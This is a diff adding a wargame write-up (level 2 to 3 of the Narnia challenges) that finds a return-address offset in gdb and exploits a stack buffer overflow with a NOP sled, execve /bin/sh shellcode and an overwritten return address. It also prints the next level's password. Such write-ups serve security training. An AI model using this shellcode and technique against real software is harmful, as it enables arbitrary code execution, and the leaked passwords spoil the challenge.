@@ -37,5 +37,78 @@ nairiepecu
 nairiepecu
   
 ### level 2 -> 3
+There is unsafe copy to buffer, we can use this to set return address to run our shellcode.
+First of all we need to find what offset the return address, we will use gdb with breakpoint before the ret command.
+```shell
+narnia2@narnia:/narnia$ gdb -q ./narnia2
+Reading symbols from ./narnia2...(no debugging symbols found)...done.
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x0804844b <+0>:     push   %ebp
+   0x0804844c <+1>:     mov    %esp,%ebp
+      ...
+   0x08048497 <+76>:    mov    $0x0,%eax
+   0x0804849c <+81>:    leave                 <- we will put breakpoint her
+   0x0804849d <+82>:    ret
+End of assembler dump.
+(gdb) b *0x0804849c
+Breakpoint 1 at 0x804849c
+(gdb) r $(python -c "print('A'*132+'B'*4)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia2 $(python -c "print('A'*132+'B'*4)")
 
+Breakpoint 1, 0x0804849c in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()                         <- the four 'B' override the return address
+```
+Now lets create the payload, it will be in this format:  
+(A series of NOP instructions(0x90)) (Shellcode) (Overridden return address)  
+the return address will jump to address just before the shellcode.  
+I use the [same](http://shell-storm.org/shellcode/files/shellcode-811.php) shellcode(25 bytes) as in the previous level.  
+We just need to know the address before the shellcode:  
+```shell
+(gdb) r $(python -c "print('A'*(132-25) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + 'B'*4)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia2 $(python -c "print('A'*(132-25) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + 'B'*4)")
+
+Breakpoint 1, 0x0804849c in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) x/150wx $esp
+0xffffd640:     0x00000000      0xffffd6d4      0xffffd6e0      0x00000000
+0xffffd650:     0x00000000      0x00000000      0xf7fc5000      0xf7ffdc0c
+...
+0xffffd7f0:     0x9e797a0d      0x9908446a      0x695d19dc      0x00363836
+0xffffd800:     0x6e2f0000      0x696e7261      0x616e2f61      0x61696e72
+0xffffd810:     0x41410032      0x41414141      0x41414141      0x41414141          <- the 'A's start somewhere here
+0xffffd820:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd830:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd840:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd850:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd860:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd870:     0x41414141      0x41414141      0x41414141      0x50c03141          <- here the shellcode start
+0xffffd880:     0x732f2f68      0x622f6868      0xe3896e69      0xe1895350
+0xffffd890:     0x0bb0c289      0x424280cd
+```
+So, let choose 0xffffd870, now use the payload!
+```shell
+narnia2@narnia:/narnia$ ./narnia2 $(python -c "print('\x90'*107 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x70\xd8\xff\xff')")
+$ cat /etc/narnia_pass/narnia3
+vaequeezee
+```
+  
 **password:**  
+vaequeezee
+                                                                                       
+### level 3 -> 4
+  
+**password:**  
+
